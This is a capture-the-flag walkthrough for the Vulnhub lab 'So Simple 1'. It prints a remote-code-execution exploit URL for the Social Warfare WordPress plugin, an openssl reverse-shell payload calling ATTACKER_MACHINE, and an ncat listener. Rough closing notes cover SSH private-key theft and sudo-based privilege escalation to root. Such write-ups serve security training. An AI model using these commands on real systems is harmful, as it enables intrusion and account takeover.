# So Simple 1

---

Machine by [@roelvb79](https://twitter.com/roelvb79)

Vulnhub [link](https://www.vulnhub.com/entry/so-simple-1,515/)

Objectives:

  * 2 user flags
  * 1 root flag

---

## Network scan


  
1. Use nmap to scan the network

    We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no aparent vulnerabilities yet.

    ![victim machine nmap scan result](img/1-nmap.png)
   
<br>

2. Visit the website

    If we visit the website we can see that there is only a big red image with the words "SO SIMPLE":
   
    ![website](img/2-website.png)

    And the website code doesn't reveal anything that's useful:

    ![website origin code](img/3-website_origin.png)

<br>

3. Attempt an ssh login

   Attempting to login with ssh shows it only accepts key authentication, thus ruling out ssh brute force with common passwords, if we want a way in we'll need an alternative


<br>

4. We'll run drib

    As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that wordpress is installed:
  
    ![dirb website results](img/4-dirb.png)

<br>

5. Use WPScan

   As we saw on the las step wordpress is installed, WPScan will show wordpress, plugins and themes versions, as well as vulnerabilities associated with them, for this we'll need an api key that we can get by creating a free account.

   And we'll run the command:  `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
   
   ![wpscan result](img/5-wpscanFirst.png)

   Here we can see that the plugin "Social Warfare has an RCE vulnerability that is probably going to work:

   ![wpscan social warfare RCE](img/6-wpscanSocialWarfare.png)

   If we scroll down further we can see the wordpress users that exist, we can see "admin" and "max":

   ![wpscan users](img/7-wpscanUsers.png)

<br>

6. Prepare the exploit

   We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/). To exploit it we'll need a web server and a payload and a netcat listener to get a reverse shell.

    - Web server

       We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on kali, we only need to enable it:

       ![enable apache](img/7-apacheStart.png)


    - Netcat
 
       We need a netcat instance to listen to our reverse shell and catch it, this will use openssl and you can find more info on the [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl) repository by [Swissky](https://github.com/swisskyrepo).
   
       The command to execute will be `ncat --ssl -vv -l -p 4242`.
       This will listen for any connection on port 4242.
      
       ![running netcat listener](img/8-ncatListener.png)
 
    - Payload
      
       The payload also comes from the same repo and it will be placed on the file `/var/www/html/payload.txt` and contain the next code:
      
        ```<pre>system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')</pre>```

      ![cat of the payload](img/9-catPayload.png)

      The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.

<br>

7. Using the exploit

   To run the exploit we need to visit the next url on a web browser:

   `http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt`

   The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111

   Here we can see what happens after visiting the URL:
   
   ![Exploit on web browser result](img/10-exploitWeb.png)

   And if we go back to the ncat terminal we can see that it has established the connection and now we have a shell with the user "www-data":
   
   ![ncat receives the shell](img/11-exploitNcat.png)
   
<br>

8. Get a user ssh key


---

---

# Ignore

10- navigate to the max user .ssh folder and get the id_rsa key, we will copy the contents and create a file on our attack machine, we'll call it "key", paste the private key into it, and chmod 600 said file.
11- add the private key with "ssh-add key"
12- ssh into the machine as max with "ssh max@192.168.56.111"
13- once in we can cat the file user.txt and get the first flag
14- using "sudo -l" we'll know what the user has acces to use as root without asking a password, this will return that the user can use /usr/sbin/service.
15- we will use "sudo -u steven /usr/sbin/service ../../bin/bash" this will change to the user steven with the permissions of max /usr/sbin/service and will make sure that we acces the user with /bin/bash as the interpreter.
16- repeat "sudo -l" for user steven, will return a "/opt/tools/server-health.sh" file (non existant), we'll create the folder tools and file server-health.sh. this file will contain: 
#!/bin/bash

bash
17- then we will "chmod +x /opt/tools/server-health.sh"
18- we can use "sudo -u root /opt/tools/server-health.sh" to get root access to the machine.
19- copy the root's ssh private key for direct root access to the machine, and get the flag from inside the root's home folder
WpScan
